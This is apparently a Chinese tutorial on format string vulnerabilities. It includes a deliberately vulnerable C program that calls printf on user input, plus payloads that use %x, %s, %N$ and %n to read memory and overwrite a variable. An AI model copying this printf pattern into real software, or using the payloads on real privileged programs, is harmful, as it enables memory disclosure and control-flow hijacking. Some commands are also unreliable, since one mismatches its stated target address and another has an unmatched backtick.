## 什么是格式化字符串漏洞
   格式化字符串exploit是一类相对侥幸的exploit。同缓冲区溢出exploit一样，格式化字符串exploit 的最终目的是重写数据以控制特权程序的执行流程。
 
   格式化字符串漏洞是由像 printf(user_input) 这样的代码引起的，其中 user_input 是用户输入的数据，具有 Set-UID root 权限的这类程序在运行的时候，printf 语句将会变得非常危险，因为它可能会导致下面的结果：
* 使得程序崩溃
* 任意一块内存读取数据
* 修改任意一块内存里的数据

    printf 函数的格式化参数：

|参数|输出类型|
|----------|-------------------------------------------------|
|%d|十进制整数|
|%u|无符号整数|
|%x|十六进制整数|
|%s|字符串|
|%n|到目前为止，已写的字节个数|

## printf 函数参数在栈中的分布
以下面的代码为例：
```
printf("A is %d and is at %08x, B is %u and is at %08x.\n", A, &A, B, &B);
```
该printf函数参数再栈中的分布如下：

![](NetworkSecurity/raw/master/index_resourses/printf_overflow_exploit/printf_buffer_exploit_01.png)

栈顶指针指向的是格式化字符串的内容，printf函数遍历该字符串，如果当前字符不是格式化参数的首字符（%），则复制输出该字符，如果遇到一个格式化参数，就采取相应的动作，并使用栈中与那个参数相对应的参量。

本文的测试代码如下：
```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(int argc, char*argv[])
{
    char text[1024];
     int test_val = -72;
    if (argc < 2)
    {
        printf("Usage: %s <text to print>\n", argv[0]);
        exit(0);
    }
    char *s=getenv("PATH");
    printf("the address of PATH is %08x, and the address of s is %08x\n", s, &s);
    strcpy(text, argv[1]);
    printf("text is located on %08x\n", text);
    printf("the write way:\n");
    printf("%s\n", text);
    printf("the wrong way:\n");
    printf(text);
    printf("\n");
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
    exit(0);
}
```
## 访问任意内存的位置
输入下面的字符串作为参数
```
AAAA%08x.%08x.%08x.%08x......%08x%08x //64个%08x
```
结果如下：
image2
当使用printf("%s", s) 输出该字符串得到正确结果。此时printf函数参数在栈中的分布如下（栈地址无实际意义，只是为了便于分析）：
image3
当使用printf(s)输出该字符串时，栈顶的指针直接指向字符串参数，并以解析格式化字符串参数的方式解析该字符串
image4
所以实际内存分布为：
image5
由上图可知从栈顶只要通过%08x向下跳8次就可以读到我们输入的字符串

已知PATH的内容存放在0xbfffff38，现在通过printf漏洞读取它的值，执行如下命令：
```
./fmt_vuln `printf "\x38\xff\xff\xbf"`%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s
```
结果如下：
image6

## 直接参数存取
在上述的exploit中，每个格式化参数参量必须顺序递进，这需要几个格式化参数%x 来递进参数参量，直到达到格式化字符串的起始位置。此外，这种顺序特性需要7个字节的无用数据，以正确的将一个完整的地址写入任意存储单元。

直接参数存取允许通过使用美元符号\$直接存取参数。例如，用%N\$d 可以访问第N个参数，并且把它以十进制形式输出。
```
printf("7th:%7$d, 4th:%4$05d\n",10,20,30,40,50,60,70,80);
```
上述printf()调用的输出如下：
```
7th:70, 4th:00040
```
用直接参数访问格式化字符串，执行如下命令:
```
./fmt_vuln AAAA%8\$x
```
img8

以字符串格式读取指定内存的内容
```
./fmt_vuln `printf "\x23\xff\xff\xbf"%8\$s
```
img9

## 改写任意内存的位置
已知变量test_val的位置：0xbfffef0c，通过printf 改写它的位置，执行如下命令：
```
./fmt_vuln `printf "\x38\xff\xff\xbf"`%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n
```
结果如下：
image7
test_val的值由-72改为67，正是到目前为止所已写的字符数量。
